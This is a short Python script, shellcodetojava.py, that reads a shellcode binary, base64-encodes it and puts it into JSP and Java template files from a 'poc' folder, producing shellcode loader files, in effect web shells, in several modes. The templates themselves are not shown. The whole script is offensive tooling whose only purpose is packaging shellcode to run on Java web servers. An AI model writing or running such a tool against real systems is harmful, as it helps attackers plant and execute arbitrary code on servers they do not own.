import base64
import os
import shutil
import re
import optparse
import time
import optparse

def Prepare():
    try:
        shutil.rmtree("output")
        os.mkdir("output")
    except:
        pass

def existsfile(filepath):
    if os.path.exists(filepath):
        print("[+] file is found:{}".format(filepath))
        data=base64.b64encode(open(filepath,"rb").read()).decode()
        return data
    else:
        print("[-] file is not found:{}".format(filepath))
        return  None

def getshellcode(shellcode,filename):
    poc=open("poc/{}.jsp".format(filename)).read().replace("AAAAAAAAA",shellcode)
    poc2=open("poc/{}.java".format(filename),"r").read().replace("AAAAAAAAA",shellcode)
    print(poc,file=open("output/{}.jsp".format(filename),"a"))
    print(poc2,file=open("output/{}.java".format(filename),"a"))
    print("write:output/{}.jsp".format(filename))
    print("write:output/{}.java".format(filename))

if __name__ == '__main__':
    Prepare()
    parser=optparse.OptionParser()
    print("example:python shellcodetojava.py -f <payload.bin> -s <mod>")
    parser.add_option("-f",dest="hexbin",help="shellcodebin")
    parser.add_option("-s",dest="mod",help="heigh/low/all")
    (option,args)=parser.parse_args()
    modlist={"heigh":"Heigh","low":"Low","all":"Poc"}
    if option.hexbin and option.mod:
        shellcodebin=option.hexbin
        mods=option.mod
        if mods not in modlist:
            print("mod is:heigh/low/all")
            exit()
        b64bin=existsfile(shellcodebin)
        if b64bin:
            getshellcode(b64bin,modlist[mods])
    else:
        parser.print_help()



